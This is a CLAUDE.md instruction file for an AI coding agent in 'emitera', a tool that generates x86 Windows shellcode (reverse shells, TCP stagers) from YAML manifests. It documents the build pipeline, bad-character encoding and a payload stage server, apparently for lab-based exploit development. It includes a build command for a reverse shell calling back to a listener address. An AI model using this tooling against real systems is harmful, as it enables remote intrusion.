# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Build and test commands

```bash
# Run the full test suite
uv run pytest

# Run a single test file or test function
uv run pytest emitera/tests/test_encode.py -q
uv run pytest emitera/tests/test_payload_templates.py::TestReverseShellAutoDerive::test_asm_output -q

# Build shellcode from a manifest (emitera CLI)
uv run emitera emitera/manifests/revshell.yaml --lhost 192.168.1.100 --lport 9001 --out emitter_out/
uv run emitera emitera/manifests/revshell.yaml --no-assemble --out emitter_out/  # skip assembly (no assembler on Mac)
```

Python 3.13 via uv. The `.venv` is managed by uv; use `uv run` for all commands. Do not use system Python or conda.

Assembly (Keystone/NASM) is only available on the Windows lab VM. Tests that require an assembler (`test_full_build_assembles`) fail on Mac; these are expected failures, not regressions.

## Writing conventions

- Documentation files go in `Documentation/`, not `docs/`.
- Never produce `.docx`, `.pptx`, or `.xlsx` files. Use PDF, Markdown, or CSV.
- Never use em dashes or en dashes in any output. Use commas, colons, parentheses, or split into two sentences.

## Emitter architecture

The emitter (`emitera/`) generates position-independent x86 Windows shellcode from YAML manifests.

### Pipeline flow

```
manifest.yaml -> schema.py (load/validate)
              -> stack_alloc.py (assign EBP-relative slot offsets)
              -> build.py:compose_asm() orchestrates:
                   1. Framework stubs (PEB walk, hash resolver) [build.py]
                   2. API resolution stubs per function [api_emitter.py]
                   3. Module loading (LoadLibraryA calls) [build.py]
                   4. String construction [string_emitter.py]
                   5. Structure initialization [structure_emitter.py]
                   6. Payload assembly [payload_templates/*.py]
              -> build.py:_assemble_aligned() (Keystone or NASM)
              -> doc_gen.py (contract.md with stack map, API table, cheatsheet)
```

### Key modules

- **`api_database.py`**: Static registry of Win32 APIRecords, StructRecords, and MODULE_LOAD_ORDER. Adding a new API function means adding an APIRecord here. If its DLL is already in MODULE_LOAD_ORDER, nothing else is needed.
- **`schema.py`**: Loads YAML manifests into a Manifest dataclass. Contains `_VALID_TEMPLATES` set; new templates must be registered here.
- **`stack_alloc.py`**: Assigns EBP-relative offsets in four zones: module_base (0x20+), api, variable/structure (0x80+), string. The `Slot.ebp_ref` property produces `[ebp-0xNN]` references. Templates must use `layout.slot(name)` for all stack references; hardcoded offsets are forbidden.
- **`encode.py`**: Bad-character-safe encoding for x86 immediates and memory operands. Produces XOR-mask pairs or arithmetic sequences that avoid specified bytes.
- **`build.py`**: Orchestrator. Also contains framework stub generation, template registry (`_load_template`), the assembler backends, and test harness generation. New templates must be added to the `registry` dict in `_load_template()`.
- **`payload_templates/base.py`**: `PayloadTemplate` ABC with `emit(layout, config)` and `cheatsheet(config)`. `probe_slots()` auto-discovers which stack slots a template uses by running `emit()` against a RecordingLayout.

### Adding a new payload template

1. Add any new APIRecords to `api_database.py` (and update `MODULE_LOAD_ORDER` if the DLL is new)
2. Add the template name to `_VALID_TEMPLATES` in `schema.py`
3. Create `payload_templates/<name>.py` with a class extending `PayloadTemplate`
4. Register it in `_load_template()` in `build.py`
5. Create a manifest YAML in `manifests/`
6. If adding a new API category, add it to the valid set in `tests/test_api_database.py`

### Manifest structure

```yaml
template: reverse_shell          # must be in _VALID_TEMPLATES
badchars: ["00", "0A", "0D"]     # hex bytes to avoid
functions:                        # Win32 APIs to resolve
  - CreateProcessA
  - LoadLibraryA
variables:                        # 4-byte stack slots
  - socket_handle
strings:                          # stack strings
  - label: cmd
    value: cmd.exe
    method: mov                   # mov, push, shiftor, or xor
    dest: edi                     # register target (for mov method)
```

### Build outputs

The emitter writes to `emitter_out/` (or `--out` path):
- `asm/generated.asm`: full assembly source
- `asm/debug_runner.py`: standalone Python script with embedded shellcode bytes, VirtualAlloc/CreateThread harness, prints WinDbg breakpoint address. This is the single file to transfer to the Windows lab VM for testing.
- `bin/shellcode.bin`: raw assembled bytes (when assembler is available)
- `Documentation/contract.md`: stack layout, API table, struct layouts, operational cheatsheet

## Other modules

- **`tcp_stage_server.py`**: Serves files over TCP with `[4-byte LE size][raw bytes]` protocol. Used with tcp_stager and tcp_download templates.
- **`strings.py`**: Low-level string-to-push-sequence generator. Used by the emitter's string_emitter.py.
